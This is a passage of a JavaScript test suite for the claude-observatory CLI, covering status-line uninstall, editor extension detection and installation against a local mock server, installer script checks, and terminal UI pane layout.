  assert.equal(r.changed, false, "a foreign statusLine's settings entry is left alone");
  assert.equal(r.scriptRemoved, true, 'but OUR script is still removed — it is ours');
  assert.equal(r.scriptKept, false);

  // The reachable orphan case: a HAND-EDITED command that no path comparison can resolve. Deleting the
  // script here leaves Claude Code erroring once a minute with nothing naming us, so it is kept AND
  // reported (the CLI prints the reason; scriptKept is what it keys on).
  for (const cmd of ['bash $HOME/.claude/statusline.sh', 'bash ~/.claude/statusline.sh']) {
    fs.writeFileSync(script, '#!/bin/bash\necho x\n');
    fs.writeFileSync(sp, JSON.stringify({ statusLine: { type: 'command', command: cmd } }));
    r = core.uninstallStatusline(sp);
    assert.equal(r.scriptRemoved, false, `${cmd}: not deleted out from under a live setting`);
    assert.equal(r.scriptKept, true, `${cmd}: and the skip is reported, not silent`);
    assert.ok(fs.existsSync(script));
  }

  // And the normal case still works end to end: ours goes, settings and script both.
  fs.writeFileSync(sp, JSON.stringify({ statusLine: { type: 'command', command: `bash "${script}"` } }));
  const r2 = core.uninstallStatusline(sp);
  assert.equal(r2.changed, true, 'ours is reverted');
  assert.equal(r2.scriptRemoved, true, 'and its script removed');
  assert.equal(JSON.parse(fs.readFileSync(sp, 'utf8')).statusLine, undefined);
  assert.ok(!fs.existsSync(script));
});

test('statusline: the vendored installer keeps the fixes a sync would silently drop', () => {
  // scripts/sync-statusline.sh overwrites this file wholesale from upstream, which does not carry
  // these. Without this test a sync would quietly re-break Windows and no one would know.
  const sh = fs.readFileSync(path.resolve(__dirname, '../../cli/statusline/install-statusline.sh'), 'utf8');
  assert.match(sh, /CMD="bash \\"\$CLAUDE_DIR\/statusline\.sh\\""/, 'the statusLine command must be QUOTED');
  assert.doesNotMatch(sh, /CMD="bash \$CLAUDE_DIR\/statusline\.sh"/, 'the unquoted upstream form must not come back');
  assert.match(sh, /winget install jqlang\.jq/, 'the jq error must name a Windows route');
});

test('install-extensions: detects an editor that does NOT yet have our extension (0.10.0)', async () => {
  // `update` refreshes only what is already installed — deliberately. This command is the other half,
  // and the detection it needs is different: it must see a bare editor. Fake HOME, real dirs.
  const home = freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;

  // The releases API is POINTED AT A LOCAL MOCK. The first version of this test let it reach
  // api.github.com, which answers 403 to an unauthenticated CI runner — so it passed on Linux, failed on
  // macOS and Windows, and would have been flaky forever.
  const http = require('http');
  const srv = http.createServer((_req, res) => {
    res.writeHead(200, { 'content-type': 'application/json' });
    res.end(
      JSON.stringify([
        {
          tag_name: 'v9.9.9',
          prerelease: false,
          draft: false,
          assets: [
            { name: 'claude-observatory-vscode-v9.9.9.vsix', browser_download_url: 'http://127.0.0.1:1/x.vsix' },
          ],
        },
      ])
    );
  });
  // await 'listening' (srv.address() is null before it), and unref so a failed assertion can never
  // leave a listening handle holding the whole suite open.
  await new Promise((r) => srv.listen(0, '127.0.0.1', r));
  srv.unref();

  // APPDATA too: jetbrainsPluginDirs() scans %APPDATA%\JetBrains unconditionally, so without this a
  // Windows contributor with PyCharm installed would see their REAL IDEs in these assertions.
  const env = {
    ...process.env,
    HOME: home,
    USERPROFILE: home,
    APPDATA: path.join(home, 'AppData', 'Roaming'),
    CLAUDE_OBSERVATORY_RELEASES_API: `http://127.0.0.1:${srv.address().port}`,
    CLAUDE_OBSERVATORY_NO_UPDATE_CHECK: '1',
  };

  // ASYNC exec, not execFileSync: the mock server runs in THIS process, so a sync child would block the
  // event loop that has to answer it — a 106-second timeout instead of a test.
  const run = (args, envOverride) =>
    new Promise((resolve, reject) => {
      cp.execFile('node', [CLI, 'install-extensions', ...args], { env: envOverride || env, encoding: 'utf8' }, (err, stdout, stderr) => {
        if (err) reject(new Error(`${args.join(' ')} failed: ${stderr || stdout || err.message}`));
        else resolve(stdout);
      });
    });
  const check = async (...extra) => JSON.parse(await run(['--check', '--json', ...extra]));

  try {
    // A fake HOME isolates the extension DIRS but not PATH, so an editor whose CLI is genuinely on this
    // machine still reports present — which is correct, and is the whole point of the `or` in
    // editorPresent: installed-but-never-launched has a CLI and no extensions dir.
    let d = await check();
    assert.deepEqual(d.jetbrains, [], 'no plugin dirs -> no JetBrains');
    assert.equal(d.version, '9.9.9', 'the reported version comes from the resolved release');
    assert.ok(
      d.vscode.every((r) => r.installed === null),
      'under a fresh HOME nothing of ours is installed in any detected editor'
    );

    // An editor that has RUN but does not have our extension: the case `update` ignores and this acts on.
    fs.mkdirSync(path.join(home, '.vscode', 'extensions'), { recursive: true });
    d = await check();
    const vsc = () => d.vscode.find((r) => r.label === 'VS Code');
    assert.ok(vsc(), 'an empty extensions dir is still a PRESENT editor');
    assert.equal(vsc().present, true);
    assert.equal(vsc().installed, null, 'and it reports our extension as not installed');

    // Now give it our extension: same row, now with a version.
    fs.mkdirSync(path.join(home, '.vscode', 'extensions', 'cell-observatory.claude-observatory-vscode-0.9.0'), {
      recursive: true,
    });
    d = await check();
    assert.equal(vsc().installed, '0.9.0', 'the installed version is read from the folder name');

    // 0.9.5 — THE EDITOR'S OWN REGISTRY WINS OVER LEFTOVER FOLDERS.
    //
    // An editor does not delete the previous version's folder when it installs a new one, and the
    // scan took the highest folder it could find. So after a switch DOWN to stable, the abandoned
    // higher folder made us keep reporting the version we had just replaced — the machine looked
    // permanently current and could never be moved again. extensions.json lists what is LOADED, one
    // row per extension, which is the only thing an update should reason about.
    const extDir = path.join(home, '.vscode', 'extensions');
    fs.mkdirSync(path.join(extDir, 'cell-observatory.claude-observatory-vscode-0.10.0-dev.12'), { recursive: true });
    fs.writeFileSync(
      path.join(extDir, 'extensions.json'),
      JSON.stringify([
        { identifier: { id: 'cell-observatory.claude-observatory-vscode' }, version: '0.9.0', relativeLocation: 'cell-observatory.claude-observatory-vscode-0.9.0' },
      ])
    );
    d = await check();
    assert.equal(vsc().installed, '0.9.0', 'the registry decides, so an orphaned higher folder cannot re-strand the install');

    // Corrupt or absent registry is NOT "nothing installed" — fall back to the folders rather than
    // reporting a clean absence we never verified.
    fs.writeFileSync(path.join(extDir, 'extensions.json'), '{ this is not json');
    d = await check();
    assert.equal(vsc().installed, '0.10.0-dev.12', 'an unreadable registry falls back to the folder scan');
    fs.rmSync(path.join(extDir, 'extensions.json'));
    fs.rmSync(path.join(extDir, 'cell-observatory.claude-observatory-vscode-0.10.0-dev.12'), { recursive: true });

    // A JetBrains IDE with no plugin of ours — again, present and actionable.
    const jb = path.join(home, 'Library', 'Application Support', 'JetBrains', 'PyCharm2026.1', 'plugins');
    fs.mkdirSync(jb, { recursive: true });
    d = await check();
    assert.equal(d.jetbrains.length, 1, 'a plugins dir is a present IDE even with no plugin of ours');
    assert.equal(d.jetbrains[0].installed, null);

    // The scope flags must agree with what a real run would do, or an installer acts on a wrong report.
    assert.equal((await check('--vscode-only')).jetbrains.length, 0, '--vscode-only hides the JetBrains surface');
    assert.equal((await check('--jetbrains-only')).vscode.length, 0, '--jetbrains-only hides the VS Code surface');

    // A DETECTION report must survive an unreachable feed — CI runners get 403 from api.github.com, and
    // an installer asking "what is on this machine?" should not die of it.
    const offline = JSON.parse(
      await run(['--check', '--json'], { ...env, CLAUDE_OBSERVATORY_RELEASES_API: 'http://127.0.0.1:1/nope' })
    );
    assert.equal(offline.version, null, 'the version is honestly null rather than a guess');
    assert.ok(offline.vscode.length >= 1, 'and detection still reports what is on the machine');

    // Bad input fails loudly rather than installing something unintended.
    for (const args of [['--vsix', path.join(home, 'nope.vsix')], ['--channel'], ['--channel', 'bogus']]) {
      await assert.rejects(() => run(args), /no such file|requires a value|unknown channel/, `install-extensions ${args.join(' ')} must fail loudly`);
    }
  } finally {
    srv.close();
  }
});

test('install-extensions: installs a LOCAL artifact into a bare JetBrains IDE (0.10.0)', () => {
  // The from-source path install.sh uses: --jetbrains-zip, no network, and it must install even though
  // nothing of ours is there yet. Exercises zipToolReady + applyJetbrainsZip + the version sentinel.
  const home = freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const env = {
    ...process.env,
    HOME: home,
    USERPROFILE: home,
    APPDATA: path.join(home, 'AppData', 'Roaming'),
    CLAUDE_OBSERVATORY_NO_UPDATE_CHECK: '1',
  };
  const jb = path.join(home, 'Library', 'Application Support', 'JetBrains', 'PyCharm2026.1', 'plugins');
  fs.mkdirSync(jb, { recursive: true });

  // A plugin zip shaped like the real asset: claude-observatory-jetbrains/lib/<name>-<version>.jar.
  // Written by writeStoredZip rather than shelling out to `zip`: the product deliberately avoids
  // zip/unzip on Windows (extractZip uses PowerShell's Expand-Archive), so demanding a `zip` binary
  // would make this test need MORE of the environment than the code it tests — and windows-latest does
  // not list one.
  const stage = fs.mkdtempSync(path.join(os.tmpdir(), 'cc-jbzip-'));
  const zip = path.join(stage, 'claude-observatory-jetbrains-v9.9.9.zip');
  writeStoredZip(zip, [
    ['claude-observatory-jetbrains/lib/claude-observatory-jetbrains-9.9.9.jar', Buffer.from('x')],
  ]);

  const out = cp.execFileSync('node', [CLI, 'install-extensions', '--jetbrains-only', '--jetbrains-zip', zip], {
    env,
    encoding: 'utf8',
  });
  assert.match(out, /JetBrains plugin →/, 'it reports the install');
  const dir = path.join(jb, 'claude-observatory-jetbrains');
  assert.ok(fs.existsSync(path.join(dir, 'lib', 'claude-observatory-jetbrains-9.9.9.jar')), 'the jar landed');
  // A local artifact installs at the CLI's OWN version — no release is fetched in this mode at all,
  // which is what makes install.sh's from-source path work offline.
  // `--version` prints "claude-observatory <semver>", so take the semver out of it.
  const cliVersion = /(\d+\.\d+\.\d+[^\s]*)/.exec(
    cp.execFileSync('node', [CLI, '--version'], { env, encoding: 'utf8' })
  )[1];
  assert.equal(
    fs.readFileSync(path.join(dir, '.observatory-version'), 'utf8').trim(),
    cliVersion,
    'the version sentinel is stamped, so a later `update` can tell what is installed'
  );
});

test('installers: every install path goes through the CLI, and offers both channels (0.10.0)', () => {
  // These scripts are not exercised by any test run (e2e is skipped on Windows and none of them run
  // here), so their CONTENT is the only thing that can be pinned. Each assertion below corresponds to a
  // defect that shipped: bash reimplementing editor detection, JetBrains only ever being downloaded and
  // never installed, and no way at all to install the pre-release channel.
  const read = (p) => fs.readFileSync(path.resolve(__dirname, '../../..', p), 'utf8');
  // Assert about CODE, not prose: these files explain in comments what they used to do wrong, and a
  // blunt doesNotMatch cannot tell the explanation from the mistake.
  const code = (s) =>
    s
      .split('\n')
      .filter((l) => !/^\s*(?:#|<#|\.[A-Z]|\s*$)/.test(l))
      .join('\n');

  const boot = read('scripts/bootstrap.sh');
  assert.match(boot, /install-extensions --channel/, 'bootstrap delegates editor install to the CLI');
  assert.match(boot, /--channel stable\|dev/, 'and documents the channel flag');
  assert.match(boot, /dev-latest/, 'the dev channel resolves the rolling pre-release tag');
  assert.doesNotMatch(code(boot), /Install Plugin from Disk/, 'it must INSTALL the JetBrains plugin, not print instructions');
  assert.doesNotMatch(code(boot), /code --install-extension/, 'and must not hand-roll the VS Code install');

  const inst = read('install.sh');
  assert.match(inst, /install-extensions/, 'the from-source installer delegates too');
  assert.match(inst, /--vsix/, 'passing the locally built .vsix rather than downloading one');
  assert.match(inst, /--jetbrains/, 'and can build + install the JetBrains plugin');
  assert.doesNotMatch(code(inst), /^\s*code --install-extension/m, 'no hand-rolled VS Code install');

  const jb = read('scripts/install-jetbrains.sh');
  assert.match(jb, /install-extensions --jetbrains-only --jetbrains-zip/, 'JetBrains install delegates to the CLI');
  assert.match(jb, /--build-only/, 'and exposes the build-only mode install.sh uses');
  assert.doesNotMatch(code(jb), /unzip -qo/, 'the bash unzip + dir-walk is gone (it never worked outside Git Bash)');

  const ps1 = read('install.ps1');
  assert.match(ps1, /install-extensions/, 'the Windows installer delegates too');
  assert.match(ps1, /Get-FileHash/, 'and verifies the CLI tarball sha256 like downloadAsset does');
  assert.match(ps1, /\$Channel/, 'and offers the channel choice');
  assert.match(ps1, /jq/, 'and is honest about the bash+jq status line');
});

test('installers: install.ps1 parses as PowerShell', { skip: !hasPwsh() }, () => {
  // A syntax error in this file is invisible until a Windows user pipes it into iex and it half-runs.
  // pwsh ships on ubuntu-latest and windows-latest runners, so CI checks it even though a mac dev
  // machine usually cannot.
  const ps1 = path.resolve(__dirname, '../../../install.ps1');
  const script =
    "$e = $null; [void][System.Management.Automation.Language.Parser]::ParseFile('" +
    ps1.replace(/'/g, "''") +
    "', [ref]$null, [ref]$e); if ($e -and $e.Count -gt 0) { $e | ForEach-Object { Write-Output $_.Message }; exit 1 }";
  const r = cp.spawnSync('pwsh', ['-NoProfile', '-NonInteractive', '-Command', script], { encoding: 'utf8' });
  assert.equal(r.status, 0, `install.ps1 has PowerShell syntax errors:\n${r.stdout}${r.stderr}`);
});

function hasPwsh() {
  const r = cp.spawnSync('pwsh', ['-NoProfile', '-Command', '$PSVersionTable.PSVersion.Major'], { encoding: 'utf8' });
  return r.status === 0;
}

/** Minimal STORED (uncompressed) zip writer — enough for a fixture, and it needs no external binary.
 *  Deliberate: the product never shells out to `zip`, so neither should its tests. */
function writeStoredZip(dest, entries) {
  const zlib = require('zlib');
  const chunks = [];
  const central = [];
  let offset = 0;
  for (const [name, body] of entries) {
    const nameBuf = Buffer.from(name, 'utf8');
    const crc = zlib.crc32 ? zlib.crc32(body) : crc32(body);
    const local = Buffer.alloc(30);
    local.writeUInt32LE(0x04034b50, 0); // local file header
    local.writeUInt16LE(20, 4); // version needed
    local.writeUInt16LE(0, 6); // flags
    local.writeUInt16LE(0, 8); // method 0 = stored
    local.writeUInt16LE(0, 10); // time
    local.writeUInt16LE(0x21, 12); // date (1980-01-01 is invalid; use a real one)
    local.writeUInt32LE(crc, 14);
    local.writeUInt32LE(body.length, 18);
    local.writeUInt32LE(body.length, 22);
    local.writeUInt16LE(nameBuf.length, 26);
    local.writeUInt16LE(0, 28);
    chunks.push(local, nameBuf, body);
    const cd = Buffer.alloc(46);
    cd.writeUInt32LE(0x02014b50, 0);
    cd.writeUInt16LE(20, 4);
    cd.writeUInt16LE(20, 6);
    cd.writeUInt16LE(0, 8);
    cd.writeUInt16LE(0, 10);
    cd.writeUInt16LE(0, 12);
    cd.writeUInt16LE(0x21, 14);
    cd.writeUInt32LE(crc, 16);
    cd.writeUInt32LE(body.length, 20);
    cd.writeUInt32LE(body.length, 24);
    cd.writeUInt16LE(nameBuf.length, 28);
    cd.writeUInt32LE(offset, 42);
    central.push(cd, nameBuf);
    offset += local.length + nameBuf.length + body.length;
  }
  const cdBuf = Buffer.concat(central);
  const end = Buffer.alloc(22);
  end.writeUInt32LE(0x06054b50, 0);
  end.writeUInt16LE(entries.length, 8);
  end.writeUInt16LE(entries.length, 10);
  end.writeUInt32LE(cdBuf.length, 12);
  end.writeUInt32LE(offset, 16);
  fs.writeFileSync(dest, Buffer.concat([...chunks, cdBuf, end]));
}

function crc32(buf) {
  let c = ~0;
  for (const b of buf) {
    c ^= b;
    for (let k = 0; k < 8; k++) c = (c >>> 1) ^ (0xedb88320 & -(c & 1));
  }
  return (~c) >>> 0;
}

test('installers: every shell script parses (they are run via curl | bash)', () => {
  // Four of the five installers are bash and nothing in the pipeline parses them — a typo ships and
  // lands on whoever runs the documented one-liner. install.ps1 has its own parser test above.
  const root = path.resolve(__dirname, '../../..');
  const scripts = ['install.sh', 'scripts/bootstrap.sh', 'scripts/install-jetbrains.sh', 'scripts/sync-statusline.sh', 'packages/cli/statusline/install-statusline.sh'];
  for (const rel of scripts) {
    const r = cp.spawnSync('bash', ['-n', path.join(root, rel)], { encoding: 'utf8' });
    assert.equal(r.status, 0, `${rel} has a bash syntax error:\n${r.stderr}`);
  }
});

// ---------------------------------------------------------------------------
// Pane layout — pure, so every degradation is asserted rather than discovered.
// ---------------------------------------------------------------------------

const L = (cols, rows, over = {}) =>
  tui.resolveLayout({ cols, rows, minimized: new Set(), focus: 'traces', ...over });

test('layout: the computed thresholds are where the spec says they are', () => {
  // These numbers are the whole degradation story, so they are pinned rather than described. Two
  // columns now, not three: Traces (30) + Detail (36) + one seam.
  assert.equal(L(67, 24).mode, 'wide', '67 columns is the exact minimum for both columns');
  assert.equal(L(66, 24).mode, 'stack', 'and 66 is one short');
  // The bottom dock opens once the column band still clears COL_FLOOR after the top band is carved.
  // Derived, not hard-coded: a structural change should move this number, not break the test.
  let opensAt = null;
  for (let r = 10; r <= 60 && opensAt === null; r++) if (L(120, r).boxes.some((b) => b.id === 'dashboards')) opensAt = r;
  assert.ok(opensAt !== null, 'the bottom dock opens at SOME height');
  assert.ok(!L(120, opensAt - 1).boxes.some((b) => b.id === 'dashboards'), `and not one row below (${opensAt - 1})`);
});

test('layout: panes tile the width exactly, with one seam between neighbours', () => {
  // An off-by-one here is invisible in a mockup and corrupts every frame, so it is checked by
  // arithmetic over a sweep rather than by eye at one width.
  // The band membership is derived from each pane's DOCK, exactly as the product derives it — a
  // test-side id list is how the first top-dock pane got silently swept into the band while this
  // test kept passing.
  const dockOf = (id) => tui.PANE_SPECS.find((p) => p.id === id).dock;
  for (let cols = 40; cols <= 200; cols += 1) {
    for (const rows of [24, 30, 36]) {
      const lay = L(cols, rows);
      const band = lay.boxes.filter((b) => dockOf(b.id) !== 'top' && dockOf(b.id) !== 'bottom').sort((a, b) => a.rect.x - b.rect.x);
      if (!band.length) continue;
      assert.equal(band[0].rect.x, 0, `${cols}x${rows}: band starts at 0`);
      for (let i = 1; i < band.length; i++) {
        const prev = band[i - 1].rect;
        assert.equal(band[i].rect.x, prev.x + prev.w + 1, `${cols}x${rows}: exactly one seam column`);
      }
      const last = band[band.length - 1].rect;
      assert.equal(last.x + last.w, cols, `${cols}x${rows}: the band ends flush at the right edge`);
      for (const b of lay.boxes) assert.ok(b.rect.w > 0 && b.rect.h > 0, 'no zero-extent box');
    }
  }
});

test('layout: the latch — growing the terminal never shrinks a pane', () => {
  // Without this, 27->28 rows takes Traces from 22 rows to 16: the panel lurches while the reader is
  // still dragging the edge. The runtime folds `forced` into `minimized`; only the reader clears it.
  // The sweep steps ONE row at a time because a real drag is continuous — a coarse sweep steps over
  // the exact boundary where the dock opens and reports a clean bill of health it did not earn.
  const sweep = (latch) => {
    const minimized = new Set();
    const seen = [];
    for (let rows = 8; rows <= 50; rows++) {
      const lay = tui.resolveLayout({ cols: 80, rows, minimized: latch ? minimized : new Set(), focus: 'traces' });
      // The PRODUCT's latch, not a re-implementation: folding `forced` in with two lines here would
      // keep passing against a runtime that had stopped latching altogether.
      if (latch) for (const id of tui.latchMinimized(minimized, lay)) minimized.add(id);
      const t = lay.boxes.find((b) => b.id === 'traces');
      seen.push({ rows, h: t ? t.rect.h : 0 });
    }
    const shrank = [];
    for (let i = 1; i < seen.length; i++) {
      if (seen[i].h < seen[i - 1].h) shrank.push({ at: seen[i].rows, from: seen[i - 1].h, to: seen[i].h });
    }
    return shrank;
  };

  // Positive control FIRST: prove the sweep can see a lurch before trusting it to report none.
  const unlatched = sweep(false);
  assert.ok(
    unlatched.length > 0,
    `the un-latched control must lurch somewhere, or this test proves nothing: ${JSON.stringify(unlatched)}`
  );

  assert.deepEqual(sweep(true), [], 'with the latch, growing never shrinks Traces');
});

test('layout: zoom gives one full-extent pane, for every pane', () => {
  for (const id of tui.PANE_SPECS.map((p) => p.id)) {
    for (const [cols, rows] of [[80, 24], [120, 36], [100, 30], [60, 20], [200, 50]]) {
      const lay = tui.resolveLayout({ cols, rows, minimized: new Set(), zoom: id, focus: id });
      assert.equal(lay.boxes.length, 1, `zoom ${id} at ${cols}x${rows}: exactly one box`);
      assert.equal(lay.boxes[0].id, id);
      assert.equal(lay.boxes[0].rect.w, cols, 'full width');
      assert.equal(lay.boxes[0].rect.h, lay.bodyH, 'full body height');
    }
  }
});

test('layout: a pane that will not fit says what it would take', () => {
  const lay = L(60, 24);
  assert.ok(!lay.boxes.some((b) => b.id === 'detail'), 'Detail does not fit beside Traces at 60 columns');
  const b = lay.blocked.find((x) => x.pane === 'detail');
  assert.ok(b && b.need === 67, `it names the 67 columns it needs, got ${JSON.stringify(b)}`);
  const d = lay.blocked.find((x) => x.pane === 'dashboards');
  assert.ok(d && d.needRows === 23, `and Dashboards names its 23 body rows, got ${JSON.stringify(d)}`);
  // Every pane keeps its chip even when it has no box, so a minimized pane never loses its counter.
  assert.equal(lay.bar.length, tui.BAR_ENTRIES.length, 'every chip stays on the window bar, open or not');
});

test('layout: the window bar leads the frame, in the order the reader was promised', () => {
  const lay = L(140, 36);
  // Order, keys and titles together: the bar is the frame's table of contents, and every one of the
  // three is something a reader navigates by.
  // SIX chips over five panes: Claude leads (who is working, and the door back to the conversation),
  // and Detail's two faces get a key each, so "show me the map" and "show me this diff" are one
  // keystroke apart rather than a keystroke and then a swap.
  assert.deepEqual(
    lay.bar.map((c) => `F${c.key} ${c.title}`),
    ['F1 Claude', 'F2 Prompts', 'F3 Traces', 'F4 Map', 'F5 Diff', 'F6 Dashboards'],
    'left to right: the agent, what was asked, what it changed, the map of it, the diff, then everything else'
  );
  assert.deepEqual(lay.bar.map((c) => c.pane), ['claude', 'prompts', 'traces', 'detail', 'detail', 'dashboards'],
    'and the two middle chips are ONE window');
  const f = tui.renderDashFrame(paneFixture(), { cols: 140, rows: 36, color: false });
  assert.match(f[0], /F1 .?Claude.*F2 .?Prompts.*F3 .?Traces.*F4 .?Map.*F5 .?Diff.*F6 .?Dashboards/, 'and row 0 draws it');
  assert.match(f[1], /fixture/, 'the session bar follows it, on row 1');
  // The digits belong to EDITS now, so no chip may advertise a bare one.
  assert.doesNotMatch(f[0], /(^|\s)[0-9]\s+.?(Prompts|Traces|Dashboards|Diff|Map)/, 'no chip claims a digit');

  // Exactly one of Detail's two chips is ever current, or the bar stops answering "where am I".
  for (const face of [0, 1]) {
    const l = tui.resolveLayout({ cols: 140, rows: 36, minimized: new Set(), focus: 'detail', tab: {}, detailFace: face });
    const lit = l.bar.filter((c) => c.focused);
    assert.equal(lit.length, 1, `face ${face}: one chip is marked`);
    assert.equal(lit[0].title, face === 1 ? 'Map' : 'Diff');
  }
});

test('layout: hit-testing reads the geometry the renderer drew from', () => {
  const lay = L(120, 36);
  for (const b of lay.boxes) {
    assert.deepEqual(tui.hitTest(lay, b.rect.x + 1, b.titleRow), { t: 'title', pane: b.id });
    for (const s of b.tabSpans) {
      const hit = tui.hitTest(lay, s.x, b.tabsRow);
      assert.deepEqual(hit, { t: 'tab', pane: b.id, index: s.index }, `tab ${s.label} is clickable where it is drawn`);
    }
    const inBody = tui.hitTest(lay, b.body.x + 3, b.body.y + 1);
    assert.equal(inBody && inBody.t, 'body');
    assert.equal(inBody.pane, b.id);
  }
  // The window bar: the chip focuses, the twig cell toggles minimize. Two targets, one chip.
  for (const chip of lay.bar) {
    assert.deepEqual(tui.hitTest(lay, chip.twigX, 0), { t: 'windowbar', pane: chip.pane, part: 'twig', face: chip.face });
    // A face chip carries WHICH face it selects, so a click on it can set the face rather than only
    // focusing the window and leaving the reader to swap.
    assert.deepEqual(tui.hitTest(lay, chip.x, 0), { t: 'windowbar', pane: chip.pane, part: 'chip', face: chip.face });
  }
  assert.equal(tui.hitTest(lay, 0, 1).part, 'session', 'row 1 is the session, sharing its line with the counts');
  assert.equal(tui.hitTest(lay, 0, 35).part, 'keys');
  assert.equal(lay.chrome.top, 2, 'two chrome rows above the body, not three');
});

test('layout: a pane with an action bar owns that row, and the mouse can reach every button', () => {
  // THE defect this redesign exists for. `makeBox` gave a tab-less pane `body.y = y + 1` while the
  // renderer drew Detail's navbar there, so `hitTest` called the button row body: every button was
  // painted where nothing was clickable, each body click landed one row off, and the pane composed
  // one line taller than its box — which the compositor dropped off the bottom.
  const st = paneFixture({
    diffPatch: '@@ -1,2 +1,3 @@\n keep\n-was\n+now\n',
    diffMeta: { id: 5, path: '/w/a.ts', added: 1, removed: 1, verb: 'Write' },
  });
  for (const cols of [80, 100, 120, 150, 200]) {
    const lay = tui.resolveLayout({ cols, rows: 36, minimized: new Set(), focus: 'detail', tab: {} });
    const box = lay.boxes.find((b) => b.id === 'detail');
    if (!box) continue;
    assert.equal(box.navRow, box.titleRow + 1, `${cols}: the bar sits under the title`);
    assert.equal(box.body.y, box.navRow + 1, `${cols}: and the body starts BELOW it`);
    assert.equal(box.body.h, box.rect.h - 2, `${cols}: two chrome rows are accounted for`);
    const btns = tui.detailNavButtons(box, st);
    assert.ok(btns.length > 0, `${cols}: some buttons are drawn`);
    for (const b of btns) {
      // Every cell the button occupies, not just its first column.
      for (const x of [b.x, b.x + b.w - 1]) {
        assert.deepEqual(tui.hitTest(lay, x, box.navRow), { t: 'nav', pane: 'detail' }, `${cols}: ${b.action} at col ${x}`);
      }
    }
  }
  // Positive control: the OLD geometry must fail this. A hand-built box with the pre-fix body offset
  // classifies the same row as body, which is exactly how the bug shipped through a green suite.
  const lay = tui.resolveLayout({ cols: 150, rows: 36, minimized: new Set(), focus: 'detail', tab: {} });
  const box = lay.boxes.find((b) => b.id === 'detail');
  const old = {
    ...lay,
    boxes: lay.boxes.map((b) => (b.id === 'detail' ? { ...b, navRow: -1, body: { ...b.body, y: b.titleRow + 1, h: b.rect.h - 1 } } : b)),
  };
  assert.equal(tui.hitTest(old, box.rect.x + 3, box.titleRow + 1).t, 'body', 'the un-fixed geometry calls the bar row body');
});

test('layout: the tab strip drops whole tabs and names the count, never clipping a label', () => {
  // Dashboards carries every "what else is going on" surface, so its strip is the long one; at narrow
  // widths some tabs cannot be drawn. A clipped tab name is the same defect as a clipped path, so the
  // strip drops whole tabs and SAYS how many it dropped.
  const all = tui.PANE_SPECS.find((p) => p.id === 'dashboards').tabs;
  let sawDrop = false;
  for (let cols = 20; cols <= 140; cols++) {
    for (const sel of [0, Math.floor(all.length / 2), all.length - 1]) {
      const lay = tui.resolveLayout({ cols, rows: 36, minimized: new Set(), focus: 'dashboards', tab: { dashboards: sel } });
      const d = lay.boxes.find((b) => b.id === 'dashboards');
      if (!d) continue;
      for (const s of d.tabSpans) {
        assert.equal(s.label, all[s.index], `cols=${cols}: label intact`);
      }
      assert.ok(d.tabSpans.some((s) => s.selected), `cols=${cols} sel=${sel}: the selected tab is always drawn`);
      // The "names the count" half, which no test ever asserted: what is hidden is REPORTED, and the
      // number is the truth rather than a decoration.
      const { pre, post } = d.tabMore;
      const drawn = d.tabSpans.length;
      const hidden = (pre ? pre.hidden : 0) + (post ? post.hidden : 0);
      assert.equal(drawn + hidden, all.length, `cols=${cols} sel=${sel}: drawn + hidden accounts for every tab`);
      if (pre) assert.equal(pre.hidden, d.tabSpans[0].index, 'the pre-count is how many precede the first drawn tab');
      if (hidden) sawDrop = true;
    }
  }
  assert.ok(sawDrop, 'the sweep must actually reach a width that drops tabs, or it proves nothing');
});

const paneFixture = (over = {}) => ({
  ...dashFixture(),
  panes: { minimized: new Set(), zoom: null, focus: 'traces', tab: {}, cursor: {}, scroll: {} },
  ...over,
});

test('tui: the Traces list can be ordered by recency, path or churn — and defaults to recency', () => {
  // A 546-file session is not read chronologically. `path` groups a package together and `churn`
  // puts the biggest changes on top; `recent` stays the default, because that is the order the
  // payload arrives in and the one the pane has always shown.
  const edits = [
    { id: 1, file: '/w/zebra.ts',  rel: 'zebra.ts',  status: 'pending', ts: 3000, added: 1,   removed: 0 },
    { id: 2, file: '/w/alpha.ts',  rel: 'alpha.ts',  status: 'pending', ts: 2000, added: 900, removed: 5 },
    { id: 3, file: '/w/middle.ts', rel: 'middle.ts', status: 'pending', ts: 1000, added: 10,  removed: 0 },
  ];
  const order = (sort) => {
    const st = paneFixture({ views: { list: { edits } }, sort, panes: { minimized: new Set(), zoom: null, focus: 'traces', tab: {}, cursor: {}, scroll: {} } });
    const frame = tui.renderDashFrame(st, { cols: 150, rows: 34, color: false });
    // The FILE HEADERS, in the order they are drawn.
    return frame.flatMap((l) => (l.match(/\b(zebra|alpha|middle)\.ts\b/) || []).slice(1));
  };

  assert.deepEqual(order(undefined), ['zebra', 'alpha', 'middle'], 'the default is the payload order');
  assert.deepEqual(order('recent'), ['zebra', 'alpha', 'middle'], 'and `recent` says so explicitly');
  assert.deepEqual(order('path'), ['alpha', 'middle', 'zebra'], 'by path');
  assert.deepEqual(order('churn'), ['alpha', 'middle', 'zebra'], 'by churn — 905, 10, 1');
  // …and the two are NOT the same ordering by accident: churn puts middle (10) above zebra (1),
  // which alphabetical also does. Make the fixture discriminate.
  const edits2 = [
    { id: 1, file: '/w/aaa.ts', rel: 'aaa.ts', status: 'pending', ts: 3000, added: 1,   removed: 0 },
    { id: 2, file: '/w/zzz.ts', rel: 'zzz.ts', status: 'pending', ts: 2000, added: 500, removed: 0 },
  ];
  const order2 = (sort) => {
    const st = paneFixture({ views: { list: { edits: edits2 } }, sort, panes: { minimized: new Set(), zoom: null, focus: 'traces', tab: {}, cursor: {}, scroll: {} } });
    return tui.renderDashFrame(st, { cols: 150, rows: 34, color: false })
      .flatMap((l) => (l.match(/\b(aaa|zzz)\.ts\b/) || []).slice(1));
  };
  assert.deepEqual(order2('path'), ['aaa', 'zzz'], 'path is alphabetical');
  assert.deepEqual(order2('churn'), ['zzz', 'aaa'], 'churn is not — the big change leads');
});

test('panes: every frame fills the terminal exactly, at every size', () => {
  for (const cols of [60, 67, 80, 98, 100, 120, 160, 200]) {
    for (const rows of [10, 20, 24, 27, 28, 36, 50]) {
      for (const color of [false, true]) {
        const f = tui.renderDashFrame(paneFixture(), { cols, rows, color });
        assert.equal(f.length, rows, `${cols}x${rows} color=${color}: exactly ${rows} lines`);
        const over = f.map((l, i) => ({ i, w: tui.displayWidth(l) })).filter((x) => x.w > cols);
        assert.deepEqual(over, [], `${cols}x${rows} color=${color}: lines over budget ${JSON.stringify(over)}`);
      }
    }
  }
});

test('panes: a wrapped row reassembles to its row text, character for character', () => {
  // A row too wide for its pane wraps. If wrapping is lossy the reader sees a path that does not
